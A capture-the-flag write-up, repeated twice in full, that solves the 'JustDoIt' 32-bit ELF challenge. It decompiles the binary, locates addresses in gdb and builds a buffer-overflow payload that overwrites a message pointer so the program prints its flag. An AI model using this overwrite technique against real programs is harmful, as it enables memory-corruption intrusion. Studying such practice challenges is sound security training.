***********************JustDoIt!***********************

First thing that i do in every CTF is checking the file to get an idea about what we are dealing with
```
 $file ./justdoit
 ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked...
```

 So know we know that we are dealing with executable 32bit ELF(Executable and Linkable Format) file , using least significant bit (LSB) and a architechure : 80386.

 Now let's check for protections
 ```
 $checksec --file=./justdoit
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
Perfect no canaries and no PIE protections but NX is enable ;So we will deal with a static memory layout and no protection for the return to main !

 Now time to start the actual work.
 since we dont have the source code let's decompile the binary with ghidraand see .
 let's dcompile main and take a look 
```c
undefined4 main(void)
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```
The firs part is not interrestin(setup of the stack and i/o/err) ; 
we can ignore the part reading the file flag.txt and copying its content into a variable called flag.

```c
pcVar1 = fgets(local_28,0x20,stdin); //local_28 size is 0x10 byte and it reads 0x20 byte
```

we can see know the vulnerability :) <br/>
buffer overflow in variable local_28 so lets rename it vuln_buffer to see it better

```c
 puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(vuln_buffer,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(vuln_buffer,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
```

  let's understand what are the interrsting variables here;
  vuln buffer that we want to overflow , flag which is a pointer to the flag.txt content,and local_14 (string) that is printed at the end.
  hmmm so know we can see the idea: <br/>
  what if we overflow vuln until we reach local_14(target) , overwrite it to point to the flag , then the flag will be printed.
  <br/><br/>
  so know let's collect the addresses of each variable with gdb. 
  ```$gdb ./justdoit```
  starting with flag which is not declared in main and use so it is a global variable so we can get its address before running the program
  ```
  gdb> info variables flag
    > 0x0804a080  flag ;no PIE so we will work with the same addresses
  ```

  let's the address of where we will start to write (vuln_buffer)
  
  ```
  gdb> break strcmp ;setting break point in a function after we set input
  gdb> run
    Welcome my secret service. Do you know the password?
     Input the password.
    =>AAAAAAAAAA           ;giving a pattern to ensure that we get the exact address
```
now the program will stop executing due to the break point in strcmp, so lets disassemble main and look at our fgets(2nd fgets not the 1st !!!).

```asm
   0x08048698 <+221>:   add    esp,0x10
   0x0804869b <+224>:   mov    eax,ds:0x804a060
   0x080486a0 <+229>:   sub    esp,0x4
   0x080486a3 <+232>:   push   eax
   0x080486a4 <+233>:   push   0x20
   0x080486a6 <+235>:   lea    eax,[ebp-0x20]   ; vuln_buffer
   0x080486a9 <+238>:   push   eax
   0x080486aa <+239>:   call   0x8048440 <fgets@plt>
```

so examin if we got the the correct address
```
 gdb> x/s $ebp-0x20   ;examin as string
  >0xffffcfb8:     "AAAAAAAAAA\n" ; we got vuln_buffer address :)
```

now we need to get the target variable's address  

```c
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
```

we are asigning the string 'failed_message' to the target betwin to libc functions setvbuf and fopen.<br/>
lets find the assembly block

```asm
   0x08048600 <+69>:    call   0x8048490 <setvbuf@plt>
   0x08048605 <+74>:    add    esp,0x10
   0x08048608 <+77>:    mov    eax,ds:0x804a038  ;offset of the string in data segment
   0x0804860d <+82>:    mov    DWORD PTR [ebp-0xc],eax  ;copying the string into the stack frame
   0x08048610 <+85>:    sub    esp,0x8
   0x08048613 <+88>:    push   0x80487d1
   0x08048618 <+93>:    push   0x80487d3
   0x0804861d <+98>:    call   0x80484a0 <fopen@plt>
```

 being still at the break point , the string is asigned already to the target so let's print it
```
  gdb> print $ebp-0xc
   > (void *) 0xffffcfcc   ;address of target
```
let's ensure of the address ; we have to get a string that indicate a failure.
```
 gdb> x/wx 0xffffcfcc    ; examin as hex word
  > 0xffffcfcc:     0x080487ab    ; this must be the string address in data segment
 gdb> x/s 0x080487ab
  > 0x80487ab:      "Invalid Password, Try Again!"   ; perfect we got all the addresses
```

  before the exploit let's analyse this part of code :
  ```
  iVar2 = strcmp(vuln_buffer,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
 ```
  What we want to do is overwrite local_14 , we will do that before strcmp . the funny part is if we do write the correct password , the value that we overwritten will get overwrite XD.
  <br/>
  So we should type the wrong password to keep our changes  !<br/>

  Now lets calculate the offset betwen vln_buffer and the target var .

  ```
  gdb> print 0xffffcfcc-0xffffcfb8
   > 0x14
```
 
 so we need a padding of 14 hex of bytes (20 bytes) then we write the address of flag in little endian because the program is using LSB

 flag_address = 0x0804a080 in little indian => 0x80a00408

 perfect let's built our payload using python2 command line
```bash
 $ python2 -c "print 'A'*20 + '\x80\xa0\x04\x08'" > exploit
```
 so we wrote the padding using 20 of A (you can use what ever you want) then the address of flag in little endian as hex values.<br/>
 we can't type them manually in the program because the hex bytes are non printable !
<br/>
 now for the final test :
```bash
 $./justdoit  < exploit

  > Welcome my secret service. Do you know the password?
    Input the password.
    afk-Yato{th1s_3xpl01t_w0rk3d}
  ```
<b> AS you see the exploit worked !!!</b>



***********************JustDoIt!***********************

First thing that i do in every CTF is checking the file to get an idea about what we are dealing with
```
 $file ./justdoit
 ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked...
```

 So know we know that we are dealing with executable 32bit ELF(Executable and Linkable Format) file , using least significant bit (LSB) and a architechure : 80386.

 Now let's check for protections
 ```
 $checksec --file=./justdoit
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
Perfect no canaries and no PIE protections but NX is enable ;So we will deal with a static memory layout and no protection for the return to main !

 Now time to start the actual work.
 since we dont have the source code let's decompile the binary with ghidraand see .
 let's dcompile main and take a look 
```c
undefined4 main(void)
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```
The firs part is not interrestin(setup of the stack and i/o/err) ; 
we can ignore the part reading the file flag.txt and copying its content into a variable called flag.

```c
pcVar1 = fgets(local_28,0x20,stdin); //local_28 size is 0x10 byte and it reads 0x20 byte
```

we can see know the vulnerability :) <br/>
buffer overflow in variable local_28 so lets rename it vuln_buffer to see it better

```c
 puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(vuln_buffer,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(vuln_buffer,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
```

  let's understand what are the interrsting variables here;
  vuln buffer that we want to overflow , flag which is a pointer to the flag.txt content,and local_14 (string) that is printed at the end.
  hmmm so know we can see the idea: <br/>
  what if we overflow vuln until we reach local_14(target) , overwrite it to point to the flag , then the flag will be printed.
  <br/><br/>
  so know let's collect the addresses of each variable with gdb. 
  ```$gdb ./justdoit```
  starting with flag which is not declared in main and use so it is a global variable so we can get its address before running the program
  ```
  gdb> info variables flag
    > 0x0804a080  flag ;no PIE so we will work with the same addresses
  ```

  let's the address of where we will start to write (vuln_buffer)
  
  ```
  gdb> break strcmp ;setting break point in a function after we set input
  gdb> run
    Welcome my secret service. Do you know the password?
     Input the password.
    =>AAAAAAAAAA           ;giving a pattern to ensure that we get the exact address
```
now the program will stop executing due to the break point in strcmp, so lets disassemble main and look at our fgets(2nd fgets not the 1st !!!).

```asm
   0x08048698 <+221>:   add    esp,0x10
   0x0804869b <+224>:   mov    eax,ds:0x804a060
   0x080486a0 <+229>:   sub    esp,0x4
   0x080486a3 <+232>:   push   eax
   0x080486a4 <+233>:   push   0x20
   0x080486a6 <+235>:   lea    eax,[ebp-0x20]   ; vuln_buffer
   0x080486a9 <+238>:   push   eax
   0x080486aa <+239>:   call   0x8048440 <fgets@plt>
```

so examin if we got the the correct address
```
 gdb> x/s $ebp-0x20   ;examin as string
  >0xffffcfb8:     "AAAAAAAAAA\n" ; we got vuln_buffer address :)
```

now we need to get the target variable's address  

```c
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
```

we are asigning the string 'failed_message' to the target betwin to libc functions setvbuf and fopen.<br/>
lets find the assembly block

```asm
   0x08048600 <+69>:    call   0x8048490 <setvbuf@plt>
   0x08048605 <+74>:    add    esp,0x10
   0x08048608 <+77>:    mov    eax,ds:0x804a038  ;offset of the string in data segment
   0x0804860d <+82>:    mov    DWORD PTR [ebp-0xc],eax  ;copying the string into the stack frame
   0x08048610 <+85>:    sub    esp,0x8
   0x08048613 <+88>:    push   0x80487d1
   0x08048618 <+93>:    push   0x80487d3
   0x0804861d <+98>:    call   0x80484a0 <fopen@plt>
```

 being still at the break point , the string is asigned already to the target so let's print it
```
  gdb> print $ebp-0xc
   > (void *) 0xffffcfcc   ;address of target
```
let's ensure of the address ; we have to get a string that indicate a failure.
```
 gdb> x/wx 0xffffcfcc    ; examin as hex word
  > 0xffffcfcc:     0x080487ab    ; this must be the string address in data segment
 gdb> x/s 0x080487ab
  > 0x80487ab:      "Invalid Password, Try Again!"   ; perfect we got all the addresses
```

  before the exploit let's analyse this part of code :
  ```
  iVar2 = strcmp(vuln_buffer,P@SSW0RD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
 ```
  What we want to do is overwrite local_14 , we will do that before strcmp . the funny part is if we do write the correct password , the value that we overwritten will get overwrite XD.
  <br/>
  So we should type the wrong password to keep our changes  !<br/>

  Now lets calculate the offset betwen vln_buffer and the target var .

  ```
  gdb> print 0xffffcfcc-0xffffcfb8
   > 0x14
```
 
 so we need a padding of 14 hex of bytes (20 bytes) then we write the address of flag in little endian because the program is using LSB

 flag_address = 0x0804a080 in little indian => 0x80a00408

 perfect let's built our payload using python2 command line
```bash
 $ python2 -c "print 'A'*20 + '\x80\xa0\x04\x08'" > exploit
```
 so we wrote the padding using 20 of A (you can use what ever you want) then the address of flag in little endian as hex values.<br/>
 we can't type them manually in the program because the hex bytes are non printable !
<br/>
 now for the final test :
```bash
 $./justdoit  < exploit

  > Welcome my secret service. Do you know the password?
    Input the password.
    afk-Yato{th1s_3xpl01t_w0rk3d}
  ```
<b> AS you see the exploit worked !!!</b>
